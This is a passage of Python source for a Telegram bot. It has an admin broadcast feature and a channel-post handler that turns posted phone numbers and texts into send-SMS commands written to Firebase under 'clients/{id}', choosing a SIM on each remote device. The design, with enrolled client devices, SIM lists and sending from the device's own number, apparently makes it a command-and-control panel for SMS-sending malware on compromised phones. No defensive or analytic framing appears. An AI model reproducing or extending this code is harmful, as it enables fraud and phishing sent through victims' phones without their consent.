𝗨𝘀𝗲𝗿𝘀 𝗰𝗮𝗻𝗻𝗼𝘁 𝘂𝘀𝗲 𝗯𝗼𝘁 𝗻𝗼𝘄 ❌
""")
    bot.answer_callback_query(call.id, "✅ Bot OFF!")

@bot.message_handler(func=lambda message: message.text == "📢 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧")
def broadcast_handler(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if user_id != ADMIN_ID:
        safe_send_message(chat_id, "❌ 𝗧𝗵𝗶𝘀 𝗶𝘀 𝗮𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗳𝗲𝗮𝘁𝘂𝗿𝗲!")
        return
    
    update_user_activity(user_id)
    
    user_states[user_id] = "waiting_for_broadcast"
    safe_send_message(chat_id, f"""
📲 𝗣𝗟𝗘𝗔𝗦𝗘 𝗦𝗘𝗡𝗗 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧 𝗠𝗘𝗦𝗦𝗔𝗚𝗘

📊 𝗧𝗼𝘁𝗮𝗹 𝗨𝘀𝗲𝗿𝘀: {len(user_all_ids)}

𝗧𝗵𝗶𝘀 𝘄𝗶𝗹𝗹 𝗯𝗲 𝘀𝗲𝗻𝘁 𝘁𝗼 𝗮𝗹𝗹 𝘂𝘀𝗲𝗿𝘀!
""")

@bot.message_handler(func=lambda message: user_states.get(message.from_user.id) == "waiting_for_broadcast")
def handle_broadcast(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    broadcast_text = message.text.strip()
    
    if user_id != ADMIN_ID:
        user_states.pop(user_id, None)
        return
    
    update_user_activity(user_id)
    user_states.pop(user_id, None)
    
    sent_count = 0
    failed_count = 0
    
    safe_send_message(chat_id, f"📲 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𝗯𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁 𝘁𝗼 {len(user_all_ids)} 𝘂𝘀𝗲𝗿𝘀...")
    
    for uid in list(user_all_ids):
        try:
            bot.send_message(uid, f"""
📢 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧 𝗠𝗘𝗦𝗦𝗔𝗚𝗘

━━━━━━━━━━━━━━━━
{broadcast_text}
━━━━━━━━━━━━━━━━

☠️ @s4_tg2
""")
            sent_count += 1
            time.sleep(0.05)
        except:
            failed_count += 1
    
    safe_send_message(chat_id, f"""
✅ 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗

📊 𝗥𝗲𝘀𝘂𝗹𝘁𝘀:
✅ 𝗦𝗲𝗻𝘁: {sent_count}
❌ 𝗙𝗮𝗶𝗹𝗲𝗱: {failed_count}
""")

@bot.channel_post_handler(func=lambda message: True)
def handle_channel_post(message):
    try:
        if not bot_mode:
            return
            
        channel_id = message.chat.id
        msg_text = message.text or message.caption or ""
        
        if not msg_text:
            return
        
        to_number, sms_message = extract_sms_details(msg_text)
        
        if not to_number or not sms_message:
            return
        
        token_user_id = None
        for user_id, token_data in user_token_channel.items():
            if token_data.get("channel_id") == channel_id:
                token_user_id = user_id
                break
        
        if token_user_id is not None:
            user_id = token_user_id
            logger.info(f"✅ Using TOKEN CN channel for user {user_id}")
        else:
            for user_id, channel_data in user_channel_data.items():
                if channel_data.get("channel_id") == channel_id:
                    break
            else:
                return
        
        if user_id not in user_selected_sim:
            logger.warning(f"❌ User {user_id} has no SIM selected")
            safe_send_message(user_id, "❌ 𝗣𝗹𝗲𝗮𝘀𝗲 𝘀𝗲𝗹𝗲𝗰𝘁 𝗮 𝗦𝗜𝗠 𝗳𝗶𝗿𝘀𝘁!")
            return
        
        if user_id not in user_firebase:
            logger.warning(f"❌ User {user_id} has no Firebase")
            return
        
        sim_info = user_selected_sim[user_id]
        fb_list = user_firebase.get(user_id, {})
        if not fb_list:
            return
        
        for fb_id, fb_data in fb_list.items():
            try:
                db = fb_data["db"]
                
                client_data = get_client_by_id(db, sim_info["client_id"])
                if not client_data:
                    logger.warning(f"❌ Client {sim_info['client_id']} not found in Firebase")
                    continue
                
                sims = client_data.get("sims", [])
                
                if sim_info.get("no_sim", False) or len(sims) == 0:
                    logger.info(f"📱 Device has NO SIM - sending SMS without SIM selection")
                    sms_data = {
                        "isSended": False,
                        "message": sms_message,
                        "to": to_number,
                        "from": "No SIM"
                    }
                    
                    send_success = False
                    try:
                        db.child(f"clients/{sim_info['client_id']}/webhookEvent/sendSms").set(sms_data)
                        logger.info(f"✅ SMS sent to No SIM device: {sim_info['client_id']}")
                        send_success = True
                    except Exception as e:
                        logger.error(f"❌ Error sending to webhookEvent: {e}")
                    
                    try:
                        db.child(f"clients/{sim_info['client_id']}/sendSms").set(sms_data)
                        send_success = True
                    except Exception as e:
                        logger.error(f"❌ Error sending to sendSms: {e}")
                    
                    if send_success:
                        safe_send_message(user_id, f"""
══════════════════════════
  🔔 𝗦𝗠𝗦 𝗦𝗘𝗡𝗧 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬 
══════════════════════════

🆔 𝗗𝗲𝘃𝗶𝗰𝗲: <code>{sim_info['client_id'][:12]}...</code>
📞 𝗧𝗼: <code>{to_number}</code>
💬 𝗠𝗲𝘀𝘀𝗮𝗴𝗲: <code>{sms_message}</code>
⚠️ 𝗡𝗼 𝗦𝗜𝗠 𝗦𝗲𝗹𝗲𝗰𝘁𝗲𝗱

✅ <b>SMS Sent!</b>
""")
                    else:
                        safe_send_message(user_id, "❌ 𝗙𝗮𝗶𝗹𝗲𝗱 𝘁𝗼 𝘀𝗲𝗻𝗱 𝗦𝗠𝗦!")
                
                elif sim_info["sim_index"] is not None and sim_info["sim_index"] < len(sims):
                    selected_sim = sims[sim_info["sim_index"]]
                    from_number = selected_sim.get("phoneNumber", "")
                    
                    sms_data = {
                        "from": sim_info["sim_index"],
                        "isSended": False,
                        "message": sms_message,
                        "to": to_number
                    }
                    
                    send_success = False
                    try:
                        db.child(f"clients/{sim_info['client_id']}/webhookEvent/sendSms").set(sms_data)
                        logger.info(f"✅ SMS sent to device: {sim_info['client_id']} using SIM {sim_info['sim_index']}")
                        send_success = True
                    except Exception as e:
                        logger.error(f"❌ Error sending: {e}")
                    
                    try:
                        db.child(f"clients/{sim_info['client_id']}/sendSms").set(sms_data)
                        send_success = True
                    except:
                        pass
                    
                    if send_success:
                        safe_send_message(user_id, f"""
═════════════════════════
  🔔 𝗦𝗠𝗦 𝗦𝗘𝗡𝗧 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬 
═════════════════════════

🆔 𝗗𝗲𝘃𝗶𝗰𝗲: <code>{sim_info['client_id'][:12]}...</code>
📞 𝗙𝗿𝗼𝗺: <code>{from_number}</code>
📞 𝗧𝗼: <code>{to_number}</code>
💬 𝗠𝗲𝘀𝘀𝗮𝗴𝗲: <code>{sms_message}</code>

✅ <b>SMS Sent!</b>
""")
                    else:
                        safe_send_message(user_id, "❌ 𝗙𝗮𝗶𝗹𝗲𝗱 𝘁𝗼 𝘀𝗲𝗻𝗱 𝗦𝗠𝗦!")
                else:
                    safe_send_message(user_id, "❌ 𝗣𝗹𝗲𝗮𝘀𝗲 𝘀𝗲𝗹𝗲𝗰𝘁 𝗮 𝗦𝗜𝗠 𝗳𝗶𝗿𝘀𝘁!")
                    
            except Exception as e:
                logger.error(f"❌ Channel post error: {e}")
                safe_send_message(user_id, f"❌ 𝗘𝗿𝗿𝗼𝗿: {str(e)}")
                
    except Exception as e:
        logger.error(f"❌ Channel post error: {e}")

print("""
   🔥 BOT STARTED - VERSION 2.0.4 🔥         
""")

save_bot_version()

load_data()

print(f"📊 Total Users: {len(user_all_ids)}")
print(f"📊 Total Firebase Connections: {len(user_firebase)}")
print(f"📊 Token Channels: {len(user_token_channel)}")
print(f"📌 Bot Version: {BOT_VERSION}")
print(f"🕐 Last Update: {LAST_UPDATE_TIME}")

while True:
    try:
        bot.infinity_polling(timeout=60, long_polling_timeout=30)
    except Exception as e:
        logger.error(f"Polling error: {e}")
        time.sleep(5)
